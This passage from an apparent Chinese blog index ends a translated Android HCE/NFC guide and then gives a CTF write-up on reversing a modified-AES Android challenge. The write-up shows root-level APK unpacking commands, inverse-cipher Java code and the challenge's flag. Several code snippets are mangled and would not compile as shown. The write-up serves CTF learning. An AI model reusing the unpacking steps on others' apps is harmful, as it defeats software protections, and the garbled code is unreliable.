关闭主机服务调用\n\nAndroid本身永远不会启动或绑定到声明为“脱离主机”的服务。这是因为实际交易由SE执行，而不是由Android服务本身执行。服务声明仅允许应用程序注册安全元件(Secure Element)上存在的AID。\n\n## 0x0A HCE和安全\n\nHCE体系结构本身提供了一个核心安全性：因为您的服务受到[BIND_NFC_SERVICE](https://developer.android.com/reference/android/Manifest.permission.html#BIND_NFC_SERVICE)系统权限的保护，所以只有操作系统可以绑定到您的服务并与之通信。这可以确保您收到的任何APDU实际上都是OS从NFC控制器接收到的APDU，并且您发回的任何APDU只会发送到操作系统，而操作系统会直接将APDU转发给NFC控制器。\n\n剩下的核心部分就是您获取应用程序发送给NFC读卡器的数据的位置。这在HCE设计中有意解耦：它不关心数据来自何处，它只是确保将其安全地传送到NFC控制器并传送到NFC读取器。\n\n为了安全地存储和检索您希望从HCE服务发送的数据，例如，您可以依靠Android应用程序沙箱，将应用程序的数据与其他应用程序隔离。有关Android安全性的更多详细信息，请阅读 [安全提示](https://developer.android.com/training/articles/security-tips.html)。\n\n## 0x0B 协议参数和细节\n\n这部分内容对于希望了解HCE设备在NFC协议的防冲突和激活阶段使用何种协议参数的开发人员很感兴趣。这允许构建与Android HCE设备兼容的读卡器基础结构。\n\n### 11.1 Nfc-A（ISO / IEC 14443 A型）协议防冲突和激活\n\n作为Nfc-A协议激活的一部分，交换多个帧。\n\n在交换的第一部分，HCE设备将呈现其UID; HCE设备应该被假定为具有随机的UID。这意味着在每个抽头中，呈现给读卡器的UID将是随机生成的UID。因此，NFC读卡器不应依赖HCE设备的UID作为身份验证或身份验证的一种形式。\n\nNFC读取器可以随后通过发送SEL_REQ命令来选择HCE设备。HCE设备的SEL_RES响应将至少设置第6位（0x20），表示设备支持ISO-DEP。注意，SEL_RES中的其他位也可以被设置，表示例如对NFC-DEP（p2p）协议的支持。由于可以设置其他位，所以想要与HCE设备交互的读者应该明确检查第6位，并且<stront style=\"box-sizing: inherit;\">不要将完整的SEL_RES与值0x20进行比较。</stront>\n\n### 11.2 ISO-DEP激活\n\nNfc-A协议激活后，NFC读取器启动ISO-DEP协议激活。它发送一个“RATS”（请求选择应答）命令。RATS响应（ATS）完全由NFC控制器生成，不能由HCE服务配置。然而，HCE实现需要满足NFC论坛对ATS响应的要求，因此NFC读卡器可以根据NFC论坛对任何HCE设备的要求设置这些参数。\n\n以下部分提供了有关NFC控制器在HCE设备上提供的ATS响应的各个字节的更多详细信息：\n\n*   TL：ATS响应的长度。不得指示大于20个字节的长度。\n*   T0：必须在所有HCE设备上设置位5,6和7，指示TA（1），TB（1）和TC（1）包含在ATS响应中。比特1至4指示FSCI，编码最大帧大小。在HCE设备上，FSCI的值必须在0h和8h之间。\n*   T（A）1：定义读卡器和模拟器之间的比特率，以及它们是否可以是不对称的。HCE设备没有比特率要求或保证。\n*   T（B）1：位1至4指示启动帧保护时间整数（SFGI）。在HCE设备上，SFGI必须<= 8h。位5到8指示帧等待时间整数（FWI）并编码帧等待时间（FWT）。在HCE设备上，FWI必须<= 8h。\n*   T（C）1：位5表示支持“高级协议功能”。HCE设备可能支持或不支持“高级协议功能”。位2表示对DID的支持。HCE设备可能支持DID，也可能不支持DID。位1表示支持NAD。HCE设备不能支持NAD并将位1设置为零。\n*   历史字节：HCE设备最多可以返回15个历史字节。愿意与HCE服务交互的NFC读卡器不应该假设历史字节的内容或它们的存在。\n\n请注意，许多HCE设备可能符合EMVCo联合的支付网络在其“非接触式通信协议”规范中指定的协议要求。尤其是：\n\n*   T0中的FSCI必须在2小时和8小时之间。\n*   T（A）1必须设置为0x80，表示仅支持106 kbit / s比特率，并且不支持读卡器和仿真器之间的非对称比特率。\n*   T（B）1中的FWI必须<= 7h。\n\n### 11.3 APDU数据交换\n\n如前所述，HCE实现仅支持单个逻辑通道。尝试在不同的逻辑通道上选择应用程序将不适用于HCE设备。\n\n## 0x0C 后记\n\n本文[翻译自](https://developer.android.com/guide/topics/connectivity/nfc/hce)谷歌开发者文档，已由本人仔细校对。如有错误，请联系我，以便修改。","tags":[{"name":"Android Developer","slug":"Android-Developer","permalink":"http://www.killshadow.xyz/tags/Android-Developer/"}]},{"title":"某AES变种题分析","date":"2018-05-09T16:00:00.000Z","path":"2018/05/10/某aes变种题分析/","raw":"---\ntitle: 某AES变种题分析\ndate: 2018-5-10\ncategories:\ntoc: ture\ntags:\n\t- Mobile Security\n\t- Reverse\n\t- CTF\ncomments: true\n---\n[源码](https://github.com/killshadow/CTFTopic/tree/master/reverse/Android/GAESAndroid)\n\n\n### 一、脱壳\n\n1.使用jeb打开下载的apk文件，发现代码十分混乱，很明显是加固混淆过的代码，所以需要先将其脱壳。\n<!-- more -->\n2.现在网络上的免费加固服务基本都是第一代，第二代加固，手动脱壳网络上也有很多的教程，这里使用一个现成的工具进行脱壳。\n3.DrizzleDumper自动脱壳工具：\n```powershell\n   cd xxxxx/drizzleDumper\n   adb push drizzleDumper /data/local/tmp\n   adb shell chmod 777 /data/local/tmp/drizzleDumper\n   adb shell\n   su\n   ./data/local/tmp/drizzleDumper com.example.zhang.gaesandroid 3\n```\n   脱下来的dex文件默认文件名为`com.example.zhang.gaesandroid_dumped_88.dex`，导出发现脱壳完毕。\n\n### 二、逻辑分析/算法分析--Decode\n1.脱壳后，将apk文件反编译，可以看到`MainActivity`中主要逻辑为：\n   明文密钥:\n   `String key=\"This is a AES-like encryptionalgorithm....Our challenge is to find the plain text of this encrypt messagewith th fixed key. \";`\n   输出密文:\n   `String encryptedText=\"eaZwtl5nsHW3ledvoZCdFla5yG13p2Txfq3AN7LEX7s2uK+v7x2Wsz/7jbe0G6R2\";`\n   寻找`plainText`满足`encrypt(plainText,key)==encryptedText`\n   所以，解法为**阅读encrypt方法，写出其逆算法**.\n\n2.encrypt算法为AES算法，可以在资源文件中找到其流程图aes.png或者从网上搜索到流程，主要逻辑为：\n   将明文按16位进行切割（如果不足补0），对每一个16位，将其用类`LightState`进行操作，加上密钥后，调用LightState的方法获得16位密文，拼接在一起获得最终密文，然后base64输出，代码逻辑为：\n   ```java\n   LightState state=new LightState(inputBytes);\n   for(int round=0;round<=10;round++) {\n       byteroundKey[]=new byte[16];\n       for(int j=0;j<16;j++) {\n           roundKey[j]=keyBytes[round*16+j];\n           }\n       if(round==0){\n           state.addRoundKey(roundKey);\n       } \n       elseif(round<10) {\n           state.substitute();\n           state.shiftRows();\n           state.mixCloumns();\n           state.addRoundKey(roundKey);\n       } \n       else {\n           state.substitute();\n           state.shiftRows();\n           state.addRoundKey(roundKey);\n       }\n   }\n   ```\n\n3.因此，可以写出逆算法逻辑（或者查到揭秘逻辑）为：\n   ```java\n   State state=new State(inputBytes, true);\n   for(int round=0;round<=10;round++) {\n       byteroundKey[]=new byte[16];\n       for(intj=0;j<16;j++) {\n       roundKey[j]=keyBytes[(10-round)*16+j];\n       }\n       if(round==0){\n           state.addRoundKey(roundKey);\n       } \n       elseif(round<10) {\n           state.inverseShiftRows();\n           state.inverseSubstitute();\n           state.addRoundKey(roundKey);\n           state.inverseMixCloumns();\n       } \n       else {\n           state.inverseShiftRows();\n           state.inverseSubstitute();\n           state.addRoundKey(roundKey);\n       }\n   }\n   ```\n   所以问题转化为写出三个核心模块`shiftRows`，`mixCloumns`，`substitute`的逆算法`inverseShiftRows`，`inverseMixCloumns`，`inverseSubstitute`\n\n4.根据提示或者阅读`LightState`代码，`shiftRows`和AES完全一致，逆算法逻辑如下：\n   ```java\n   publicvoid inverseShiftRows() {\n       for(inti=0;i<4;i++) {\n           bytetemp[]=new byte[4];\n           for(intj=0;j<4;j++) {\n               temp[j]=_statesi;\n           }\n           for(intj=0;j<4;j++) {\n               _statesi=temp[(4+j-i)%4];\n           }\n       }\n   }\n   ```\n   `substitute`也没有做改变，其逻辑为对_states4每一个byte，做一个变换得到输出sbox(byte)，因此逆算法在于写出`inverseSbox`方法，这里有三种路径获得：\n   - 遍历sbox所有输入，得到所有输出，做成查找表即可\n\n   - 直接查找AES的S盒逆查找表（如<http://www.blogfshare.com/aes-rijndael.html>）\n\n   - `LightState`中有`inverseSbox`方法，可直接调用，最终写法为：\n\n     ```java\n     publicvoid inverseSubstitute() {\n          for(int i=0;i<4;i++) {\n             for(intj=0;j<4;j++) {\n                 *statesi=inverseSbox(*statesi);\n             }\n          }\n     }\n     ```\n\n5.`mixCloumns`做了改变，变化在于计算用于求模的多项式从`x8+x4+x3+x+1`变`x8+x4+x3+x^2+1`，但是逻辑没有改变，因此，正向逻辑为每一列左乘矩阵：\n   ```java\n   2,3,1,1\n   1,2,3,1\n   1,1,2,3\n   3,1,1,2\n   ```\n\n6.逆算法同样为左乘逆矩阵(矩阵值可以网上查到)：\n   ```java\n   e,b,d,9\n   9,e,b,d\n   d,9,e,b\n   b,d,9,e\n   ```\n\n7.所以需要写出修改后的乘法算法，在`LightState`中给出了没有改动多项式的乘法算法`multiply(inta, int b)`作为参考，可以仿照其样子写，需要改写的是两个多项式乘积后模原来的多项式这部分逻辑改成模新的多项式，逻辑如下：\n   ```java\n   publicstatic byte multiply_new(int a, int b) {\n       if(a<0){\n           a+=256;\n       }\n       if(b<0){\n       b+=256;\n       }\n       intvalues[]=new int[8];\n       inttemp=a;\n       for(inti=0;i<8;i++) {\n           values[i]=temp%2;\n           temp/=2;\n       }\n       intresults[]=new int[11];\n       if((b&0x08)>0){\n           for(inti=0;i<8;i++) {\n               if(values[i]>0){\n                   results[i+3]=(results[i+3]+1)%2;\n               }\n           }\n       }\n\n       if((b&0x04)>0){\n           for(inti=0;i<8;i++) {\n               if(values[i]>0){\n                   results[i+2]=(results[i+2]+1)%2;\n               }\n           }\n       }\n       if((b&0x02)>0){\n           for(inti=0;i<8;i++) {\n               if(values[i]>0){\n                 results[i+1]=(results[i+1]+1)%2;\n               }\n           }\n       }\n\n       if((b&0x01)>0){\n           for(inti=0;i<8;i++) {\n               if(values[i]>0){\n                   results[i]=(results[i]+1)%2;\n               }\n           }\n       }\n       if(results[10]>0){\n       results[6]=(results[6]+1)%2;\n       results[5]=(results[5]+1)%2;\n       results[4]=(results[4]+1)%2;\n       results[2]=(results[2]+1)%2;\n       }\n\n       if(results[9]>0){\n       results[5]=(results[5]+1)%2;\n       results[4]=(results[4]+1)%2;\n       results[3]=(results[3]+1)%2;\n       results[1]=(results[1]+1)%2;\n       }\n\n       if(results[8]>0){\n       results[4]=(results[4]+1)%2;\n       results[3]=(results[3]+1)%2;\n       results[2]=(results[2]+1)%2;\n       results[0]=(results[0]+1)%2;\n       }\n\n       return(byte) (results[7]*128+results[6]*64+results[5]*32+results[4]*16+results[3]*8+results[2]*4+results[1]*2+results[0]);\n   }\n   ```\n   主要修改在最后三个if，即模新的多项式。\n\n8.所以列混淆的逆算法可以写为：\n\n   ```java\n   publicvoid inverseMixCloumns() {\n       for(intj=0;j<4;j++) {\n           bytetemp[]=new byte[4];\n           for(int i=0;i<4;i++) {\n               temp[i]=_statesi;\n           }\n\n           _states0=add(multiply_new(temp[0],0xe), multiply_new(temp[1], 0xb), multiply_new(temp[2], 0xd),multiply_new(temp[3], 0x9));\n\n           _states1=add(multiply_new(temp[0],0x9), multiply_new(temp[1], 0xe), multiply_new(temp[2], 0xb),multiply_new(temp[3], 0xd));\n\n           _states2=add(multiply_new(temp[0],0xd), multiply_new(temp[1], 0x9), multiply_new(temp[2], 0xe),multiply_new(temp[3], 0xb));\n\n           _states3=add(multiply_new(temp[0],0xb), multiply_new(temp[1], 0xd), multiply_new(temp[2], 0x9),multiply_new(temp[3], 0xe));\n       }\n   }\n   ```\n\n9.至此三个逆算法完成，即可获得逆算法，最终flag为：\n   `flag{aes_is_the_best_encryption}`","tags":[{"name":"Mobile Security","slug":"Mobile-Security","permalink":"http://www.killshadow.xyz/tags/Mobile-Security/"},{"name":"Reverse","slug":"Reverse","permalink":"http://www.killshadow.xyz/tags/Reverse/"},{"name":"CTF","slug":"CTF","permalink":"http://www.killshadow.xyz/tags/CTF/"}]}]